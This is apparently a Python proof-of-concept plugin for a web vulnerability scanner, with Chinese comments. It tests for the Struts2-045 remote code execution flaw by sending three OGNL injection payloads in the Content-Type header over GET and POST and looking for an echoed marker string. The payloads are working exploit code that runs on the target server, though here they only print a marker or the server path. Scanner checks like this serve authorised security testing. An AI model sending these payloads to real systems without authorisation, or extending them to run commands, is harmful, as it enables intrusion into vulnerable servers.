#!/usr/bin/env python3
# @Time    : 2020-04-08
# @Author  : caicai
# @File    : poc_struts2_045.py

import copy
from myscan.lib.helper.request import request
from myscan.lib.core.common import get_random_num
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.config import scan_set


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "Struts2-045"
        self.vulmsg = "Struts2-045远程代码执行"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 添加限定条件
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        check = b'<Struts2-vuln-Check>'
        payloads = [
            r"%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('<'+'Struts2-vuln-'+'Check>')).(#o.close())}",
            r"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#path=#req.getRealPath('Struts2-vuln-'+'Check>')).(#o.println(#path)).(#o.close())}",
            r'''%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("Struts2-vuln-"+"Check>"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#scan.getInputStream(),#ros)).(#ros.flush())}'''
        ]

        for payload in payloads:
            for method in ["GET", "POST"]:
                req = {
                    "url": self.url,
                    "method": method,
                    "headers": {"Content-Type": payload,
                                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"},
                    "verify": False,
                    "timeout": 10,
                }
                r = request(**req)
                if r != None:
                    if check in r.content:
                        parser_ = response_parser(r)
                        self.result.append({
                            "name": self.name,
                            "url": self.url,
                            "level": self.level,  # 0:Low  1:Medium 2:High
                            "detail": {
                                "vulmsg": self.vulmsg,
                                "request": parser_.getrequestraw(),
                                "response": parser_.getresponseraw(),
                            }
                        })
                        return
